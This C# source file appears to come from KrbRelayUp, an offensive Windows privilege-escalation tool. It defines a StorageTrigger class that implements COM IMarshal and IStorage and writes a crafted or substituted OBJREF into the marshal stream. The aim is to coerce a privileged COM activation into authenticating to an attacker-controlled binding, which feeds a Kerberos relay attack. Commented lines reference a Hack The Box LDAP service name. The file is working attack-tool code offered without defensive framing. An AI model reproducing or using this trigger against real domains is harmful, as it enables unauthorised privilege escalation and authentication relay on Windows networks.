using KrbRelayUp.Relay.Com;
using System;
using System.Runtime.InteropServices;

namespace KrbRelayUp.Relay
{
    public enum TowerProtocol : ushort
    {
        EPM_PROTOCOL_DNET_NSP = 0x04,
        EPM_PROTOCOL_OSI_TP4 = 0x05,
        EPM_PROTOCOL_OSI_CLNS = 0x06,
        EPM_PROTOCOL_TCP = 0x07,
        EPM_PROTOCOL_UDP = 0x08,
        EPM_PROTOCOL_IP = 0x09,
        EPM_PROTOCOL_NCADG = 0x0a, /* Connectionless RPC */
        EPM_PROTOCOL_NCACN = 0x0b,
        EPM_PROTOCOL_NCALRPC = 0x0c, /* Local RPC */
        EPM_PROTOCOL_UUID = 0x0d,
        EPM_PROTOCOL_IPX = 0x0e,
        EPM_PROTOCOL_SMB = 0x0f,
        EPM_PROTOCOL_NAMED_PIPE = 0x10,
        EPM_PROTOCOL_NETBIOS = 0x11,
        EPM_PROTOCOL_NETBEUI = 0x12,
        EPM_PROTOCOL_SPX = 0x13,
        EPM_PROTOCOL_NB_IPX = 0x14, /* NetBIOS over IPX */
        EPM_PROTOCOL_DSP = 0x16, /* AppleTalk Data Stream Protocol */
        EPM_PROTOCOL_DDP = 0x17, /* AppleTalk Data Datagram Protocol */
        EPM_PROTOCOL_APPLETALK = 0x18, /* AppleTalk */
        EPM_PROTOCOL_VINES_SPP = 0x1a,
        EPM_PROTOCOL_VINES_IPC = 0x1b, /* Inter Process Communication */
        EPM_PROTOCOL_STREETTALK = 0x1c, /* Vines Streettalk */
        EPM_PROTOCOL_HTTP = 0x1f,
        EPM_PROTOCOL_UNIX_DS = 0x20, /* Unix domain socket */
        EPM_PROTOCOL_NULL = 0x21
    }

    [ComVisible(true)]
    public class StorageTrigger : IMarshal, IStorage
    {
        private IStorage storage;
        private string binding;
        private TowerProtocol towerProtocol;
        private object SobjRef;

        public StorageTrigger(IStorage storage, string binding, TowerProtocol towerProtocol, object SobjRef = null)
        {
            this.storage = storage;
            this.binding = binding;
            this.towerProtocol = towerProtocol;
            this.SobjRef = SobjRef;
        }

        public void DisconnectObject(uint dwReserved)
        {
        }

        public void GetMarshalSizeMax(ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS, out uint pSize)
        {
            pSize = 1024;
        }

        public void GetUnmarshalClass(ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS, out Guid pCid)
        {
            pCid = new Guid("00000306-0000-0000-c000-000000000046");
        }

        public void MarshalInterface(IStream pstm, ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS)
        {
            //ObjRef objRef = new ObjRef(Ole32.IID_IUnknown,
            //      new ObjRef.Standard(0x1000, 1, 0x0703d84a06ec96cc, 0x539d029cce31ac, new Guid("{042c939f-54cd-efd4-4bbd-1c3bae972145}"),
            //        new ObjRef.DualStringArray(new ObjRef.StringBinding(towerProtocol, binding), new ObjRef.SecurityBinding(0xa, 0xffff, null))));
            //
            //
            //byte[] data = new byte[] { };
            //if (SobjRef == null)
            //{
            //    data = objRef.GetBytes();
            //}
            //else
            //{
            //    //objRef = new ObjRef(Ole32.IID_IUnknown,
            //    //  new ObjRef.Standard((uint)((COMObjRefStandard)SobjRef).Flags, (uint)((COMObjRefStandard)SobjRef).PublicRefs, ((COMObjRefStandard)SobjRef).Oxid, ((COMObjRefStandard)SobjRef).Oid, ((COMObjRefStandard)SobjRef).Ipid,
            //    //    new ObjRef.DualStringArray(new ObjRef.StringBinding(towerProtocol, binding), new ObjRef.SecurityBinding(0x0010, 0xffff, "LDAP/ADMINIS-UB1IMGM.htb.local"))));
            //    //data = objRef.GetBytes();
            //    data = ((COMObjRefStandard)SobjRef).ToArray();
            //}
            uint written;
            var data = ((COMObjRefStandard)SobjRef).ToArray();
            pstm.Write(data, (uint)data.Length, out written);
        }

        public void ReleaseMarshalData(IStream pstm)
        {
        }

        public void UnmarshalInterface(IStream pstm, ref Guid riid, out IntPtr ppv)
        {
            ppv = IntPtr.Zero;
        }

        public void Commit(uint grfCommitFlags)
        {
            storage.Commit(grfCommitFlags);
        }

        public void CopyTo(uint ciidExclude, Guid[] rgiidExclude, IntPtr snbExclude, IStorage pstgDest)
        {
            storage.CopyTo(ciidExclude, rgiidExclude, snbExclude, pstgDest);
        }

        public void CreateStorage(string pwcsName, uint grfMode, uint reserved1, uint reserved2, out IStorage ppstg)
        {
            storage.CreateStorage(pwcsName, grfMode, reserved1, reserved2, out ppstg);
        }

        public void CreateStream(string pwcsName, uint grfMode, uint reserved1, uint reserved2, out IStream ppstm)
        {
            storage.CreateStream(pwcsName, grfMode, reserved1, reserved2, out ppstm);
        }

        public void DestroyElement(string pwcsName)
        {
            storage.DestroyElement(pwcsName);
        }

        public void EnumElements(uint reserved1, IntPtr reserved2, uint reserved3, out IEnumSTATSTG ppEnum)
        {
            storage.EnumElements(reserved1, reserved2, reserved3, out ppEnum);
        }

        public void MoveElementTo(string pwcsName, IStorage pstgDest, string pwcsNewName, uint grfFlags)
        {
            storage.MoveElementTo(pwcsName, pstgDest, pwcsNewName, grfFlags);
        }

        public void OpenStorage(string pwcsName, IStorage pstgPriority, uint grfMode, IntPtr snbExclude, uint reserved, out IStorage ppstg)
        {
            storage.OpenStorage(pwcsName, pstgPriority, grfMode, snbExclude, reserved, out ppstg);
        }

        public void OpenStream(string pwcsName, IntPtr reserved1, uint grfMode, uint reserved2, out IStream ppstm)
        {
            storage.OpenStream(pwcsName, reserved1, grfMode, reserved2, out ppstm);
        }

        public void RenameElement(string pwcsOldName, string pwcsNewName)
        {
        }

        public void Revert()
        {
        }

        public void SetClass(ref Guid clsid)
        {
        }

        public void SetElementTimes(string pwcsName, FILETIME[] pctime, FILETIME[] patime, FILETIME[] pmtime)
        {
        }

        public void SetStateBits(uint grfStateBits, uint grfMask)
        {
        }

        public void Stat(STATSTG[] pstatstg, uint grfStatFlag)
        {
            storage.Stat(pstatstg, grfStatFlag);
            pstatstg[0].pwcsName = "hello.stg";
        }
    }
}